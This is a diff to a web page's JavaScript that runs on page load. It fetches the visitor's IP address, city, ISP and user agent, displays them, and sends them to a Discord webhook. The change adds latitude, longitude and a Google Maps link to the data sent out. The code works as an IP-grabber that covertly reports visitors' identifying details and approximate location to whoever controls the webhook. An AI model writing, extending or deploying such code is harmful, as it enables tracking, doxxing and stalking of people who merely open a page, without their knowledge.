@@ -12,7 +12,9 @@ async function fetchIPData() {
       countryCode: data.country_code,
       city: data.city,
       isp: data.org || "Unknown ISP",
-      userAgent: navigator.userAgent // Get user agent
+      latitude: data.latitude,
+      longitude: data.longitude,
+      userAgent: navigator.userAgent // Get User-Agent
     };
   } catch (error) {
     console.error("Error fetching IP data:", error);
@@ -22,6 +24,8 @@ async function fetchIPData() {
       countryCode: "XX",
       city: "Unknown",
       isp: "Unknown",
+      latitude: "Unknown",
+      longitude: "Unknown",
       userAgent: "Unknown"
     };
   }
@@ -33,9 +37,11 @@ function getCountryFlagEmoji(countryCode) {
 }
 
 // Function to send data to Discord webhook
-async function sendToDiscord(ip, country, city, flag, isp, userAgent) {
+async function sendToDiscord(ip, country, city, flag, isp, latitude, longitude, userAgent) {
+  const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+  
   const data = {
-    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}\n**ISP:** ${isp}\n**User-Agent:** ${userAgent}`,
+    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}\n**ISP:** ${isp}\n**Coordinates:** [${latitude}, ${longitude}](<${googleMapsLink}>)\n**User-Agent:** ${userAgent}`
   };
 
   try {
@@ -54,18 +60,20 @@ async function sendToDiscord(ip, country, city, flag, isp, userAgent) {
 
 // Main function to fetch and display/send user data
 async function main() {
-  const { ip, country, countryCode, city, isp, userAgent } = await fetchIPData();
+  const { ip, country, countryCode, city, isp, latitude, longitude, userAgent } = await fetchIPData();
   const flag = getCountryFlagEmoji(countryCode);
+  const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
   // Display the IP address, city, ISP, and flag on the webpage
   document.getElementById("ip-address").textContent = ip;
   document.getElementById("country-flag").textContent = flag;
   document.getElementById("city").textContent = city;
   document.getElementById("isp").textContent = isp;
-  document.getElementById("user-agent").textContent = userAgent; // Display User-Agent
+  document.getElementById("coordinates").textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+  document.getElementById("map-link").innerHTML = `<a href="${googleMapsLink}" target="_blank">View on Google Maps</a>`;
 
-  // Send IP, country, city, ISP, flag, and User-Agent to Discord
-  await sendToDiscord(ip, country, city, flag, isp, userAgent);
+  // Send all data to Discord
+  await sendToDiscord(ip, country, city, flag, isp, latitude, longitude, userAgent);
 }
 
 // Run the main function when the page loads
